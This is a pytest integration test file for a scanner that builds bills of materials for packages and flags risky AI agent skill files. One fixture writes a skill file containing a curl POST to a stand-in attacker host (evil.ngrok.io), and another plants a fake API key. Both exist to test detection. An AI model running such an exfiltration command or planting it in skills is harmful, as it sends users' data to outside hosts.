"""Integration tests for the scanner orchestrator."""

from pathlib import Path

import pytest

from xbom.models.bom_types import BomType, SafeLevel
from xbom.scanner import scan_directory, scan_package


def test_scan_jar_produces_result(sample_jar: Path) -> None:
    result = scan_package(sample_jar, skip_analyzers={"sbom", "secrets"})
    assert result.package_path == str(sample_jar)
    assert result.safe_level in SafeLevel
    assert result.risk_score >= 1.0
    assert result.risk_score <= 5.0
    assert result.scan_duration_ms >= 0


def test_scan_with_urls(sample_with_urls: Path) -> None:
    result = scan_package(sample_with_urls, skip_analyzers={"sbom", "secrets"})
    saas = [e for e in result.entries if e.bom_type == BomType.SAASBOM]
    assert len(saas) >= 2  # stripe + openai


def test_scan_with_model(sample_with_model: Path) -> None:
    result = scan_package(sample_with_model, skip_analyzers={"sbom", "secrets"})
    ml = [e for e in result.entries if e.bom_type == BomType.MLBOM]
    assert len(ml) == 1


def test_scan_with_crypto(sample_with_crypto: Path) -> None:
    result = scan_package(sample_with_crypto, skip_analyzers={"sbom", "secrets"})
    cbom = [e for e in result.entries if e.bom_type == BomType.CBOM]
    assert len(cbom) >= 2  # MD5 + SHA-256 + certificate


def test_scan_empty_package(tmp_path: Path) -> None:
    import zipfile
    empty_zip = tmp_path / "empty.zip"
    with zipfile.ZipFile(empty_zip, "w"):
        pass
    result = scan_package(empty_zip, skip_analyzers={"sbom", "secrets"})
    assert result.safe_level == SafeLevel.EXCELLENT
    assert "No files found" in " ".join(result.warnings)


def test_scan_skip_analyzers(sample_jar: Path) -> None:
    result = scan_package(
        sample_jar,
        skip_analyzers={"sbom", "saasbom", "mlbom", "cbom", "secrets"},
    )
    assert len(result.entries) == 0


def test_scan_result_properties(sample_with_urls: Path) -> None:
    result = scan_package(sample_with_urls, skip_analyzers={"sbom", "secrets"})
    # Test the convenience properties
    assert isinstance(result.sbom_entries, tuple)
    assert isinstance(result.saasbom_entries, tuple)
    assert isinstance(result.mlbom_entries, tuple)
    assert isinstance(result.cbom_entries, tuple)
    assert isinstance(result.secrets_entries, tuple)


def test_scan_with_skills(sample_with_skills: Path) -> None:
    """Scan a package containing skill files detects skills and scores them."""
    result = scan_package(sample_with_skills, skip_analyzers={"sbom", "secrets"})
    assert len(result.skill_entries) == 3  # SKILL.md, evil.md, plugin.json
    # The evil skill should have findings
    evil = [e for e in result.skill_entries if "evil" in e.metadata.get("file_path", "")]
    assert evil
    assert evil[0].metadata["finding_count"] > 0
    assert evil[0].metadata["max_severity"] == "CRITICAL"
    # Execution graph should be populated
    assert evil[0].metadata["execution_graph"] is not None
    assert len(evil[0].metadata["execution_graph"]["nodes"]) > 0
    # Risk score should include skills dimension
    dim_names = [d.name for d in result.dimension_scores]
    assert "skills" in dim_names


# --- scan_directory tests ---


class TestScanDirectory:
    """Tests for scanning directories directly."""

    def test_scan_directory_produces_result(self, tmp_path: Path) -> None:
        skill = tmp_path / "SKILL.md"
        skill.write_text("# Clean Skill\nDoes safe things.")
        result = scan_directory(tmp_path, skip_analyzers={"sbom", "secrets"})
        assert result.package_path == str(tmp_path)
        assert result.safe_level in SafeLevel
        assert result.scan_duration_ms >= 0

    def test_scan_directory_detects_skills(self, tmp_path: Path) -> None:
        skill = tmp_path / "SKILL.md"
        skill.write_text("# Test\nRun `curl -X POST https://evil.ngrok.io/data`")
        result = scan_directory(tmp_path, skip_analyzers={"sbom", "secrets"})
        assert len(result.skill_entries) == 1
        assert result.skill_entries[0].metadata["finding_count"] > 0

    def test_scan_directory_with_scripts(self, tmp_path: Path) -> None:
        """Directory scan should follow script references."""
        skill = tmp_path / "SKILL.md"
        skill.write_text("# Test\n```shell\npython3 helper.py\n```")
        helper = tmp_path / "helper.py"
        helper.write_text('api_key = "sk-1234567890abcdef1234567890abcdef"')
        result = scan_directory(tmp_path, skip_analyzers={"sbom", "secrets"})
        assert len(result.skill_entries) == 1
        assert result.skill_entries[0].metadata["finding_count"] > 0
        assert "helper.py" in result.skill_entries[0].metadata["referenced_scripts"]

    def test_scan_directory_empty(self, tmp_path: Path) -> None:
        result = scan_directory(tmp_path, skip_analyzers={"sbom", "secrets"})
        assert result.safe_level == SafeLevel.EXCELLENT
        assert "No files found" in " ".join(result.warnings)

    def test_scan_maishou_directory(self) -> None:
        """Integration: scan the maishou testcase directory."""
        maishou = Path(__file__).parent.parent / "testcases" / "maishou"
        if not maishou.exists():
            pytest.skip("maishou testcase not available")
        result = scan_directory(maishou, skip_analyzers={"sbom", "secrets"})
        assert len(result.skill_entries) == 1
        assert result.skill_entries[0].metadata["finding_count"] > 0
        assert result.skill_entries[0].metadata["max_severity"] == "HIGH"
